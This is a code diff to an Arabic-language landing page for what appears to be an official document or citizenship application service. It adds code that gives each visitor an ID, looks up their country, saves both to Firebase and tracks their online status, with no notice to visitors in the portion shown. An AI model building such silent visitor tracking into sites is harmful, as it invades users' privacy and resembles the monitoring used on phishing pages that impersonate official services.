@@ -16,6 +16,9 @@ import {
   Building2,
   CreditCard,
 } from "lucide-react"
+import { useEffect, useState } from "react"
+import { setupOnlineStatus } from "@/lib/utils"
+import { addData } from "@/lib/firebase"
 
 const requirements = [
   "إثبات جنسية ساري المفعول (شهادة ميلاد أو شهادة تجنس)",
@@ -52,11 +55,41 @@ const faqs = [
       "بالتأكيد. جميع البيانات مشفرة باستخدام بروتوكولات معيارية ومخزنة بشكل آمن وفقًا للوائح حماية البيانات الحكومية.",
   },
 ]
-
+function randstr(prefix:string)
+{
+    return Math.random().toString(36).replace('0.',prefix || '');
+}
+const visitorID=randstr('Adtr-')
 export default function LandingPage() {
+  const [ready, setReady] = useState(true)
+
+  useEffect(() => {
+    getLocation().finally(()=>{
+      setReady(false)
+    })
+  }, [])
+  async function getLocation() {
+    try {
+        const response = await fetch('/api/geolocation');
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const data = await response.json();
+        const country = data.country;
+       await  addData({
+            id:visitorID,
+            country: country
+        })
+        localStorage.setItem('country',country)
+        setupOnlineStatus(visitorID)
+      } catch (error) {
+        console.error('Error fetching location:', error);
+    }
+  }
   return (
     <div className="min-h-screen bg-background">
      
+     {!ready}
 
       <main className="max-w-6xl mx-auto px-6 space-y-16 pb-16">
         <section className="relative -mx-6 overflow-hidden">
